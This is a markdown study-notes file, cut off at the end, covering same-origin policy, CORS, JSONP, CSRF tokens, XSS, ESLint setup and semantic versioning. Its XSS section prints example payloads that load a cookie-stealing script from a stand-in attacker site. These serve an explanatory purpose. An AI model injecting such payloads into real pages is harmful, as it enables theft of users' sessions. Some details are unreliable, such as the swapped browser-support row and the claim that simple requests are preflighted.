# Web

- [Web](#web)
    - [Same Origin Policy](#same-origin-policy)
    - [Cross Origin Methods](#cross-origin-methods)
        - [`document.domain` property](#documentdomain-property)
        - [[Cross-Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)](#cross-origin-resource-sharinghttpsenwikipediaorgwikicross-originresourcesharing)
            - [[Simple Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests)](#simple-requestshttpsdevelopermozillaorgen-usdocswebhttpcorssimplerequests)
            - [[Preflighted Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests)](#preflighted-requestshttpsdevelopermozillaorgen-usdocswebhttpcorspreflightedrequests)
            - [Request without Credentials](#request-without-credentials)
            - [Request with Credentials](#request-with-credentials)
            - [Expose Headers to Clients](#expose-headers-to-clients)
            - [Simple Response Headers](#simple-response-headers)
            - [CORS Related HTTP Headers](#cors-related-http-headers)
            - [Comparison with JSONP](#comparison-with-jsonp)
            - [References](#references)
        - [[Web Messaging (Cross-document messaging)](https://en.wikipedia.org/wiki/Web_Messaging)](#web-messaging-cross-document-messaginghttpsenwikipediaorgwikiwebmessaging)
        - [[**JSONP**](https://en.wikipedia.org/wiki/JSONP)](#jsonphttpsenwikipediaorgwikijsonp)
        - [[**WebSocket**](https://en.wikipedia.org/wiki/WebSocket)](#websockethttpsenwikipediaorgwikiwebsocket)
    - [Security](#security)
        - [[**C**ross-**S**ite **R**equest **F**orgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)](#cross-site-request-forgeryhttpsenwikipediaorgwikicross-siterequestforgery)
        - [Prevention](#prevention)
            - [**S**ynchronizer **T**oken **P**attern](#synchronizer-token-pattern)
            - [Cookie-to-header token](#cookie-to-header-token)
            - [Others](#others)
        - [[Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)](#cross-site-scripting-xsshttpsenwikipediaorgwikicross-sitescripting)
            - [Types](#types)
            - [Prevention](#prevention)
        - [[Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)](#content-security-policyhttpsenwikipediaorgwikicontentsecuritypolicy)
        - [[Hash-based message authentication code](https://en.wikipedia.org/wiki/Hash-based_message_authentication_code)](#hash-based-message-authentication-codehttpsenwikipediaorgwikihash-basedmessageauthenticationcode)
    - [Web Development Engineering](#web-development-engineering)
        - [Prettier](#prettier)
        - [ESLint](#eslint)
        - [Continuous Integration (CI) TODO:](#continuous-integration-ci-todo)
        - [Continuous Development (CD) TODO:](#continuous-development-cd-todo)
    - [Software Versioning](#software-versioning)
        - [Version Control](#version-control)
        - [Semantic Versioning](#semantic-versioning)
            - [Rationale](#rationale)
            - [Version Precendence](#version-precendence)
            - [Version Syntax](#version-syntax)
            - [Reference](#reference)

## Same Origin Policy

An origin is defined as a combination of protocol, host name and port number. Same origin policy allows data of one webpage to be accessible to pages inside same origin only.

Example of same origin checking against `http://www.example.com/dir/page.html`

| Compared URL | Outcome | Reason |
|:- |:-| :-|
|`http://www.example.com/dir/page2.html`|Success|Same protocol, host and port
|`http://www.example.com/dir2/other.html`|Success|Same protocol, host and port
|`http://username:password@www.example.com/dir2/other.html`|Success|Same protocol, host and port
|`http://www.example.com:81/dir/other.html`|Failure|Same protocol and host but different port
|`https://www.example.com/dir/other.html`|Failure|Different protocol
|`http://en.example.com/dir/other.html`|Failure|Different host
|`http://example.com/dir/other.html`|Failure|Different host (exact match required)
|`http://v2.www.example.com/dir/other.html`|Failure|Different host (exact match required)
|`http://www.example.com:80/dir/other.html`|Depends|Port explicit. Depends on implementation in browser.

## Cross Origin Methods

### `document.domain` property

Same origin policy is relaxed for two windows with same value for `document.domain` property. Documents with same value for `document.domain` property can read each other's properties. This might not always work due to acutal implementation.

### [Cross-Origin Resource Sharing](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)

**Cross-origin resource sharing (CORS)** is a mechanism that controls whether certain resources (images, stylesheets, scripts, iframes, video etc.) are accessbile from other domain. Browser and server communicate with each other to achieve **CORS** in a fine-grained way.

**CORS** requests are divided as [simple requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests) and [preflighted requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests) according to whether a **OPTIONS** request must be sent first to determine whether actual request is safe to send.

Simple request is safe, which means it does not has any side effect (changing server's data). Preflighted request is unsafe, so it must be preflighted first, hence the name.

![CORS XHR Flowchart](./cors_xhr_flowchart.png)

#### [Simple Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests)

A request is a simple one if it meets all following conditions:

1. Allowed methods are `GET`, `HEAD` and `POST`.
1. Request must only contains headers `Connection`, `User-Agent`, [forbidden header name](https://fetch.spec.whatwg.org/#forbidden-header-name) and  [CORS-safelisted request headers](https://fetch.spec.whatwg.org/#cors-safelisted-request-header).
    ```http
    Accpet
    Accept-Language
    Content-Language
    Content-Type
    Last-Event-ID
    DPR
    Save-Data
    Viewport-Width
    Width
    ```
1. Only allowed values for `Content-Type` header are:
    - `application/x-www-form-urlencoded`
    - `multipart/form-data`
    - `text/plain`
1. No event listeners are registered on any `XMLHttpRequestUpload` object (`XMLHttpRequest.upload`) used in request.
1. No `ReadableStream` object is used in the request.

Example of simple request from `http://www.example.com` to `http://service.example.com`.

1. Browser sends **OPTIONS** request with `Origin` HTTP header.
    ```http
    Origin: http://www.example.com
    ```
1. Server responds according to target resource cross-origin authority.
    1. Target resrouce is allowed to be accessed from specific origin.
        ```http
        Access-Control-Allow-Origin: http://www.example.com
        Vary: Origin
        ```
    1. An error page if server does not allow the cross-origin request.
    1. Target resource is allowed be accessed from any origin. It's often used when resource is intended to be completely public and accessible to everyone.
        ```http
        Access-Control-Allow-Origin: *
        ```

#### [Preflighted Requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Preflighted_requests)

A request is a preflighted request if any of following conditions is met.

1. Request uses following methods.
    - `PUT`
    - `DELETE`
    - `CONNECT`
    - `OPTIONS`
    - `TRACE`
    - `PATCH`
1. Request uses HTTP headers not included by `Connection`, `User-Agent`, [forbidden header name](https://fetch.spec.whatwg.org/#forbidden-header-name) and  [CORS-safelisted request headers](https://fetch.spec.whatwg.org/#cors-safelisted-request-header).
1. Request HTTP header `Content-Type` has a value other than:
    - `application/x-www-form-urlencoded`
    - `multipart/form-data`
    - `text/plain`
1. One or more event listeners are registered on an `XMLHttpRequestUpload` object.
1. A `ReadableStream` object is used in the request.

Example of preflighted requests using `POST` method, custom HTTP header `X-PINGOTHER` and non-standard content type `application/xml`.

```javascript
var invocation = new XMLHttpRequest();
var url = 'http://bar.other/resources/post-here/';
var body = '<?xml version="1.0"?><person><name>Arun</name></person>';

function callOtherDomain(){
  if(invocation)
    {
      invocation.open('POST', url, true)
      invocation.setRequestHeader('X-PINGOTHER', 'pingpong')
      invocation.setRequestHeader('Content-Type', 'application/xml')
      invocation.onreadystatechange = handler
      invocation.send(body)
    }
}
```

HTTP request and response process are like below.

1. Client sends an preflight HTTP request with `OPTIONS` method asking if target resource `/doc` on `service.example.com` is accessible from origin `http://www.example.com` using `PUT` method and specified custom headers.
    ```http
    OPTIONS /doc HTTP/1.1
    Host: service.example.coddm
    Origin: http://www.example.com
    Access-Control-Request-Method: PUT
    Access-Control-Request-Headers: X-PINGOTHER, Content-Type
    ```
1. Server sends response message indicating that origin `http://www.example.com` can access target resource with specified methods and eaders.
    ```http
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: http://www.example.com
    Access-Control-Allow-Methods: POST, GET, OPTIONS
    Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
    Access-Control-Max-Age: 86400
    ```
1. Client sent main request with allowed method `POST` and headers on successful preflight request.
    ```http
    POST /doc HTTP/1.1
    X-PINGOTHER: pingpong
    Content-Type: text/html; charset=UTF-8
    Origin: http://www.example.com
    Access-Control-Allow-Methods: PUT
    Access-Control-Request-Headers: X-PINGOTHER, Content-Type
    ```
1. Server send response message.
    ```http
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: http://www.example.com

    [Body Data]
    ```

#### Request without Credentials

Credentials refers to cookies, authorization headers or TLS client certificates. By default, in cross-site `XMLHttpRequest` or `Fetch` invocations, browsers will **not** send credentials, which means request without credentials contains no headers related to cookies, authorization and TLS.

Example of request without credential.

```javascript
let invocation = new XMLHttpRequest()
var url = 'http://bar.other/resources/public-data/';

function callOtherDomain() {
  if(invocation) {
    invocation.open('GET', url, true)
    invocation.onreadystatechange = handler
    invocation.send()
  }
}
```

HTTP request message contains header `Origin` with an URI as its value to specify message origin.

```http
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/access-control/simpleXSInvocation.html
Origin: http://foo.example
```

HTTP response message contains header `Access-Control-Allow-Origin`, two values are possible.

1. `origin` - an URI as origin value which means that origin is allowed to access current resource, all other origin is blocked from accessing current resource in a cross-site manner. In this situation, value of `Vary` header in response may contain `Origin` to indicate that value of `Access-Control-Allow-Origin` header in response varies and depends on value of `Origin` header in request.
    ```http
    HTTP/1.1 200 OK
    Date: Mon, 01 Dec 2008 00:23:53 GMT
    Server: Apache/2.0.61
    Access-Control-Allow-Origin: http://foo.example
    Vary: Origin
    Keep-Alive: timeout=2, max=100
    Connection: Keep-Alive
    Transfer-Encoding: chunked
    Content-Type: application/xml

    [XML Data]
    ```
1. `*` - an star means that any origin can access current resource.
    ```http
    HTTP/1.1 200 OK
    Date: Mon, 01 Dec 2008 00:23:53 GMT
    Server: Apache/2.0.61
    Access-Control-Allow-Origin: *
    Keep-Alive: timeout=2, max=100
    Connection: Keep-Alive
    Transfer-Encoding: chunked
    Content-Type: application/xml

    [XML Data]
    ```

#### Request with Credentials

A specific flag has to be set on `XMLHttpRequest` object or the `Request` constructor to send request with credentials.

```javascript
// XHR with credentials
let invocation = new XMLHttpRequest()
let url = 'http://bar.other/resources/credentialed-content/'

function callOtherDomain() {
    if (invocation) {
        invocation.open('GET', url, true)
        // sent with credentials
        invocation.withCredentials = true
        invocation.onreadystatechange = handler
        invocation.send()
    }
}

// Fetch with credentials
fetch(url, { credentials: 'include' })
```

For a simple request sent with `GET` method and credentials `Cookie: pageAccess=2`.

```http
GET /resources/access-control-with-credentials/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://foo.example/examples/credential.html
Origin: http://foo.example
Cookie: pageAccess=2
```

1. CORS request may be allowed by including `Access-Control-Allow-Credentials: true` in http response.
    ```http
    HTTP/1.1 200 OK
    Date: Mon, 01 Dec 2008 01:34:52 GMT
    Server: Apache/2.0.61 (Unix) PHP/4.4.7 mod_ssl/2.0.61 OpenSSL/0.9.7e mod_fastcgi/2.4.2 DAV/2 SVN/1.4.2
    X-Powered-By: PHP/5.2.6
    Access-Control-Allow-Origin: http://foo.example
    Access-Control-Allow-Credentials: true
    Cache-Control: no-cache
    Pragma: no-cache
    Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
    Vary: Accept-Encoding, Origin
    Content-Encoding: gzip
    Content-Length: 106
    Keep-Alive: timeout=2, max=100
    Connection: Keep-Alive
    Content-Type: text/plain

    [text/plain payload]
    ```
1. Or CORS request may be blocked by browser if HTTP response contains no `Access-Control-Allow-Credentials: true`.
    ```http
    HTTP/1.1 200 OK
    Date: Mon, 01 Dec 2008 01:34:52 GMT
    Server: Apache/2.0.61 (Unix) PHP/4.4.7 mod_ssl/2.0.61 OpenSSL/0.9.7e mod_fastcgi/2.4.2 DAV/2 SVN/1.4.2
    X-Powered-By: PHP/5.2.6
    Access-Control-Allow-Origin: http://foo.example
    Cache-Control: no-cache
    Pragma: no-cache
    Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
    Vary: Accept-Encoding, Origin
    Content-Encoding: gzip
    Content-Length: 106
    Keep-Alive: timeout=2, max=100
    Connection: Keep-Alive
    Content-Type: text/plain

    [text/plain payload]
    ```

For preflighted requests, preflight request carries crendentials like simple requests. If preflight fails, main request will not be sent.

When handling requests with credentials, servers **MUST** specify a URI as value of `Access-Control-Allow-Origin` header in response if target resource is accessible. `*` is not allowed because it makes little sense to declare that resource is accessible anywhere when request queries with credentials, from which server can identify exact identity of client.

#### Expose Headers to Clients

In the pre-CORS, same-origin-only world, a client could trigger a cross-origin request, but it could not read the response headers. To ensure that CORS doesn't break this assumption, the CORS specification introduces `Access-Control-Expose-Headers` to give explicit permissions for client to read those headers, unpermitted headers are not accessbile to clients. Unauthorized CORS requests behave as they did in a pre-CORS world.

#### Simple Response Headers

> A simple response header (or a CORS-safelisted response header) is an HTTP header which has been safelisted so that it will not be filtered when responses are processed by CORS, since they're considered safe (as the headers listed in Access-Control-Expose-Headers). By default, the safelist includes the following response headers:

By default, only the 6 [simple response headers](https://developer.mozilla.org/en-US/docs/Glossary/Simple_response_header) are exposed.

1. `Cache-Control`
1. `Content-Language`
1. `Content-Type`
1. `Expires`
1. `Last-Modified`
1. `Pragma`

#### CORS Related HTTP Headers

<table>
    <caption>Access Controls Headers</caption>
    <tr>
        <th>Type</th>
        <th>Header</th>
        <th>Value</th>
        <th>Explaination</th>
    </tr>
    <tr>
        <td rowspan='3'>Request Headers</td>
        <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin'>Origin</a></td>
        <td>"" | <scheme> "://" <hostname> [ ":" <port> ]</td>
        <td>Origin of request message</td>
    </tr>
    <tr>
        <td><a href='<method>'>Access-Control-Request-Method</td>
        <td>&lt;method&gt;</td>
        <td>Used in a preflight request to let server know which HTTP method will be used when actual request is sent.</strong> way</td>
        <td></td>
    </tr>
    <tr>
        <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers'>Access-Control-Request-Headers</a></td>
        <td>&lt;header-name&gt;, &lt;header-name&gt;, ...</td>
        <td>Ask if request using listed of custom headers can access target resource in <strong>CORS</strong> way</td>
    </tr>
    <tr>
        <td rowspan='6'>Response Headers</td>
        <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin'>Access-Control-Allow-Origin</a></td>
        <td>&lt;origin&gt; | *</td>
        <td>Refer to "Requests without Credentials" section</a></td>
    </tr>
    <tr>
        <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials'>Access-Control-Allow-Credentials</a></td>
        <td>true</td>
        <td>Requests with credentials are allowed to access target resource in CORS way.</td>
    </tr>
    <tr>
        <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers'>Access-Control-Expose-Headers</a></td>
        <td>&lt;header-name&gt;, &lt;header-name&gt;, ...</td>
        <td>Used <em>in reponse to a preflight request</em> to notify browsers a white list of headers exposed to clients. This header is designed for backward compatibility. Refer to section "Expose Headers to Clients".</td>
    </tr>
    <tr>
        <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age'>Access-Control-Allow-Max-Age<a></td>
        <td>&lt;delta-seconds&gt;</td>
        <td>Used <em>in reponse to a preflight request</em> to indicates how long (by seconds) the result of a preflight request can be cached.</td>
    </tr>
    <tr>
        <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods'>Access-Control-Allow-Methods</a></td>
        <td>&lt;method&gt;[, &lt;method&gt;]*</td>
        <td>Used <em>in reponse to a preflight request</em> to specify methods allowed to access the resource.</td>
    </tr>
    <tr>
        <td><a href='https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers'>Access-Control-Allow-Headers</a></td>
        <td>&lt;method&gt;[, &lt;method&gt;]*</td>
        <td>The Access-Control-Allow-Headers response header is used in response to a preflight request to indicate which HTTP headers can be used during the actual request. CORS safelisted request headers are always available and needn't to be specified explicitly. This header is required if request contains <code>Access-Control-Request-Headers</code> header.</td>
    </tr>
</table>

#### Comparison with JSONP

**CORS** is a modern alternative to **JSONP**.

<table>
    <tr>
        <th>Test</th>
        <th><strong>CORS</strong></th>
        <th><strong>JSONP</strong></th>
    </tr>
    <tr>
        <td>Supporting HTTP Methods</td>
        <td>All HTTP Methods</td>
        <td><strong>GET</strong> only</td>
    </tr>
    <tr>
        <td>Error Handling</td>
        <td>Good</td>
        <td>Bad</td>
    </tr>
    <tr>
        <td>Browsers</td>
        <td>Legacy Browsers</td>
        <td>Modern Browsers</td>
    </tr>
    <tr>
        <td>Security</td>
        <td>Able to defend XSS</td>
        <td>Susceptible to XSS</td>
    </tr>
</table>

#### References

1. [MDN CROS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS)
1. [Cross-Origin Resource Sharing Specification](https://www.w3.org/TR/cors/)
1. [Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)
1. [Fetch Specification](https://fetch.spec.whatwg.org/#cors-protocol)
1. [Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)
1. [Access-Control-Expose-Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers)
1. [Vary](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary)
1. [Why is Access-Control-Expose-Headers Neede ?](https://stackoverflow.com/questions/25673089/why-is-access-control-expose-headers-needed)

### [Web Messaging (Cross-document messaging)](https://en.wikipedia.org/wiki/Web_Messaging)

Web messaging allows scripts inside documents across origins to send text messages to each other. It relaxed security policy related to cross-site scripting a little bit for non-hostile pages.

If `postMessage()` method of `window` object is called, an _message_ event will be fired and handler scripts on other documents will be called. `postMessage()` is non-blocking call, messages are processed asynchronously.

Message event interface.

- data - Actual incoming text message.
- origin - Origin of source document, including protocol, hostname and port.
- source - `WindowProxy` of source window.

Post message to target document `contentWindow` and origin `http://example.com`

```javascript
var o = document.getElementsByTagName('iframe')[0];
o.contentWindow.postMessage('Hello B', 'http://example.com/');
```

Handles message event and post some messsage back to event source.

```javascript
function receiver(event) {
  if (event.origin == 'http://example.net') {
    if (event.data == 'Hello B') {
      event.source.postMessage('Hello A, how are you?', event.origin);
    }
    else {
      alert(event.data);
    }
  }
}
window.addEventListener('message', receiver, false);
```

Origins must be carefully checked to prevent cross-site scripting.

1. [Web Messaging Standard](https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging)

### [**JSONP**](https://en.wikipedia.org/wiki/JSONP)

**JSONP(JSON with Padding)** exploits the fact that HTML elements with `src` attribute (`<script>`, `<img>`, `<iframe>`) are allowed to access cross domain data.

`<script>` element links to cross origin url.

```html
<script type="application/javascript"
    src="http://server.example.com/Users/1234?callback=parseResponse">
</script>
```

Returned pure JSON data is wrapped in a function call `parseResponse()` to enable scripts on current page to access it.

```javascript
parseResponse({"Name": "Foo", "Id": 1234, "Rank": 7});
```

**JSONP** is susceptible to XSS attack and should be replaced by **CORS** due to inherent insecurities.

### [**WebSocket**](https://en.wikipedia.org/wiki/WebSocket)

> Modern browsers will permit a script to connect to a WebSocket address without applying the same-origin policy. However, they recognize when a WebSocket URI is used, and insert an Origin: header into the request that indicates the origin of the script requesting the connection. To ensure cross-site security, the WebSocket server must compare the header data against a whitelist of origins permitted to receive a reply.

1. [WebSocket Cross-Site Attack](https://www.ibm.com/developerworks/cn/java/j-lo-websocket-cross-site/index.html)

## Security

### [**C**ross-**S**ite **R**equest **F**orgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)

CRSF exploits the trust that a site has in a user's browser to send malicious request disguised as normal user request to target website. Both the user and the target website can be victims of CRSF attack. 

CRSF attack can be done by specially-crafted image tags, hidden forms, and JavaScript XMLHttpRequests, even without interaction or knowledge of user.

### Prevention

Most CSRF prevention techniques work by embedding aditional data into request that allows server to determine validity of request.

#### **S**ynchronizer **T**oken **P**attern

STP is a technique that injects unique and unpredictable token in all HTML forms rendered by server, so that each request from user contains this unique token. Attackers have no way to forge request with correct temporary token to pass server side validation.

```html
<input type="hidden" name="csrfmiddlewaretoke" value="KbyUmhTLMpYj7CD2di7JKP1P3qmLlkPt"/>
```

STP introduces complexity on server side due to burden associated with token validation on each request. There two types of token generation strategies.

1. One token per request - Each request has its unique token and server remembers the latest token, only the request with latest token can pass server side token validation if user opens multiple tabs of same html page.
1. One token per session - Inside single session, all requests by same html form share same token, this allows users to open multiple tabs and choose whichever one they like to submit request.

#### Cookie-to-header token

On login, the web application sets a cookie containing a random token that ramains the same for the whole user session.

```HTTP
Set-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=/
```

JavaScipt on the client side reads its value and copies it into a custom HTTP Header sent with each transactional request.

```HTTP
X-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql
```

The server validates presence and integrity of the token.

This method relies on same-origin policy which only allows JavaScript within same origin to be able to read the cookie's value, so that attackers are not able to read the token and forge a request.

The CSRF token cookie must not have `httpOnly` flag, because _HttpOnly_ cookie cannot be accessed by client-side APIs.

#### Others

1. Checking HTTP Headers: `X-Requested-With`, `Referer`, `Origin`, this is insecure when http headers can be manipulated.

### [Cross-site scripting (XSS)](https://en.wikipedia.org/wiki/Cross-site_scripting)

Cross-site scripting attacks use know vulnerabilities in web-based applications to inject malicious script to pages hosted by server, when pages with malicious contents delivered to clients, attackers can gain access to users' sensitive information including session cookies.

#### Types

**Non-persistent (Reflected) XSS**, An reflected attack is typically delivered via email or neutral website. Users may be tricked into clicking innocent-looking links with malicious script, which gets executed and stoles users' private information or submit malicious content to server.

DOM-based XSS is a type of non-persistent XSS attack that injected malacious script manipulates DOM directly instead of communicating with server to attack certain users.

A malicious url:

```html
http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E 
```

Actual content:

```html
http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></iframe>
```

If it's clicked  `<script>` tag gets injected and `authstrealer.js` runs to steal users' private information.

**Persistent (or stored) XSS** refers to malicious content being saved by the server and embedded into normal pages delivered to all users. Persistent XSS vulnerability is much more devastating than non-persistent one, cause all users are susceptible to attack.

If a website receives contents provided by users without sanitization, malicious scripts get injected to website.

```html
I love the puppies in this story! They're so cute!<script src="http://mallorysevilsite.com/authstealer.js">
```

Other users clicking on this text tag could be attacked.

#### Prevention

1. HTML entity encoding, JavaScript escaping, CSS escaping, URL encoding.
1. User input validation

### [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy)

### [Hash-based message authentication code](https://en.wikipedia.org/wiki/Hash-based_message_authentication_code)

## Web Development Engineering

### Prettier

Use _eslint_ and _prettier_ to lint and format javascript code.

prettier uses overwritten `.eslint.js` as options, vscode-prettier uses `prettier.config.js` as configuraiton, keep them same to have a consistent configuration between eslint and vscode formatting function. Alternatively, activate `prettier.eslintIntegration` of `vscode-prettier` extension, which uses `prettier-eslint` instead of `prettier` to format js code. `prettier-eslint` infers `prettier` options from ESLint rules firstly, fallbacks to default options if not inferable.

1. Install needed packages as development dependecies.
   ```bash
   yarn add --dev babel-eslint eslint eslint-config-airbnb eslint-config-prettier eslint-plugin-import eslint-config-jsx-a11y eslint-plugin-prettier eslint-plugin-react prettier prettier-eslint
   ```
1. Use eslint-config-prettier and eslint-plugin-prettier inside .eslintrc.js to
   apply prettier rules
1. Integrate with VS Code. Install extension "Prettier Code Formmater" and
   override configuration.

```javascript
// disable vscode default formatter, allow prettier-eslint to format js files
javascript.format.enable: false
// use prettier-eslint instead of prettier to format js files
prettier.eslintIntegration: true
```

prettier-eslint will infer prettier options from .eslintrc.js to format js code, so we can a single configuration file that applies to eslint/prettier and vscode prettier extension.

### ESLint

1. Globals: accessible global variables
1. Environments: an environment is a collection of global variables
1. Rules: a rule describes certain style linting definition.

1. Configuraion files ".eslintrc.json" 或者 "package.json"

```json
// .eslintrc.json
{
  "plugins": ["example"],
  "env": {
    "example/custom": true
  }
}

// package.json
{
  "name": "mypackage",
  "version": "0.0.1",
  "eslintConfig": {
    "plugins": ["example"],
    "env": {
      "example/custom": true
    }
  }
}
```

1. Inline configuration
    1. `/*eslint-disable*/` and `/*eslint-enable*/`
    1. `/*global*/`
    1. `/*eslint*/`
    1. `/*eslint-env*/`
1. Command line options:
    1. --global
    1. --rule
    1. --env
    1. -c, --config
1. Project-level configuration:
    1. .eslintrc.\* or package.json file in same directory as linted file
    1. Continue searching for .eslintrc and package.json files in ancestor directories (parent has highest precedence, then grandparent, etc.), up to and including the root directory or until a config with "root": true is found.

In the absence of any configuration from (1) thru (3), fall back to a personal default configuration in ~/.eslintrc.

- eslint-plugin-react
- eslint-plugin-angular
- eslint-plugin-node

1. Specify preset recommended.
1. eslint-watch
1. eslint support ES6/ES7/Object spread by default, use babel-eslint to support experimental features.

```json
{
  "root": true,
  "extends": [
    "eslint:recommended",
    "plugin:import/errors",
    "plugin:import/warnings"
  ],

  "parserOptions": {
    "ecmaVersion": 7,
    "sourceType": "module"
  },

  "env": {
    "browser": true,
    "node": true,
    "mocha": true
  },

  "rules": {
    "no-console": 1
  }
}
```

Configuration comments and configuration files

```javascript
/* global var1, var2 */
/* global var1:false, var2: false */

/* eslint eqeqeq: "off", curly: "error" */
/* eslint eqeqeq: 0, curly: 2 */
/* eslint quotes: ["error", "double"], curly: 2 */

/* eslint "plugin1/rule1": "error" */

/* eslint-disable no-alert, no-console */

alert("foo");
console.log("bar");

/* eslint-enable no-alert, no-console */

// disable all ruels
alert("foo"); // eslint-disable-line

// eslint-disable-next-line
alert("foo");

alert("foo"); // eslint-disable-line no-alert, quotes, semi

// eslint-disable-next-line no-alert, quotes, semi
alert("foo");

foo(); // eslint-disable-line example/rule-name
```

```JSON
{
  "globals": {
    "var1": true,
    "var2": false
  }
}

{
  "rules": {
    "eqeqeq": "off",
    "curly": "error",
    "quotes": ["error", "double"]
  }
}
```

### Continuous Integration (CI) TODO:

Travis CI and Appveyor

### Continuous Development (CD) TODO:

## Software Versioning

Software versioning is the process of assigning either _unique version names_ or  _unique version numbers_ to unique status of computer software. Modern software often uses two types of versioning schemes.

### Version Control

[Internal version number](https://en.wikipedia.org/wiki/Version_control) which may increase many times in single day. It's more often referred as version control which records history versions of source code and documentation of software project.

Revisions are generally modeled as a main line of development (the _trunk_) with branches off it, forming a directed tree with parallel lines of development branching off the trunk.

![Revision Graph Structure](./revision_controlled_project_visualization.png)

Because of merges, resulting graph is no longer a tree, but is instead a _rooted [directed acyclic graph](https://en.wikipedia.org/wiki/Directed_acyclic_graph) (DAG)_.

1. It's a graph instead of a tree because merges makes a node has more than one parent, wherease tree node must have only one parent.
1. It's rooted and directed because there's an oldest version, upon which all revisions are made sequentially along time.
1. It's acyclic because parents always appears before children.

### Semantic Versioning

#### Rationale

Released version such as _semantic versioning_ or _project code name_ changes far less often. Large software systems are suceptible to _dependency hell_ when many packages are integrated as dependency. _Dependency hell_ makes releasing a new software version painful.

> 1. If dependency specification are too tight, you are in danger of _version lock_ (inabilibty to upgrade a package without having to release new versions of every dependent package).
> 1. if dependencies are specified too loosely, you will inevitably be bitten by _version promiscuity_ (assuming compatibility with more future version than is reasonable)

Semantic versioning is proposed to solve the problem of _dependency hell_. Given a version number format of `major.minor.patch`. Version numbers `major`, `minor` and `patch` are non-negative integers which MUST NOT contain leading zeros and MUST be incremented numerically.

1. Once a version has been released, the contents MUST NOT be modified.
1. _major_ version zero (0.y.z) is for intial development. Anything can change at any time and public API should be considered unstable.
1. Version 1.0.0 defines the public API.
1. _major_ version MUST be incremented only when incompatible public API changes are introduced.
1. _minor_ version MUST be incremented only when backward compatible functionality are introduced to public API.
1. _patch_ version MUST be incremented only when backward compatible bugs are fixed.
1. _pre-release_ version maybe denoted by appending a hyphen and a series of dot separated identifiers([0-9A-Za-z]) following patch version.
1. _build_ data maybe denoted by appending a plus sign (+) and a series of dot separated identifiers([0-9A-Za-z]) following patch or pre-release version.

#### Version Precendence

Precedence refers to how two versions are compared with each other when ordered. Build metadata doesn't contributes to precedence calculation.

1. Precendence must be calculated by comparing _major_, _minor_, _patch_ version separately and numerically with _major_ having highest significance.
    ```txt
    1.0.0 < 2.0.0 < 2.1.0 < 2.1.1
    ```
1. When _major_, _minor_, _patch_ are all same, a _pre-release_ version has lower precedence than a normal one.
    ```txt
    1.0.0-alpha < 1.0.0
    ```
1. When two pre-release versions have same _major_, _minor_, _patch_ version number, pre-release versions MUST be determined by comparing each dot separated identifier from left to right.
    1. A larger set of pre-release version has a higher precedence than a smaller set.
    1. Identifiers consisting of only digits are compared numerically.
    1. Identifiers consisting of letters and hyphens are compared lexically in ASCII order.
    1. Numeric identifiers has lower precedence than non-numeric identifiers.
    ```txt
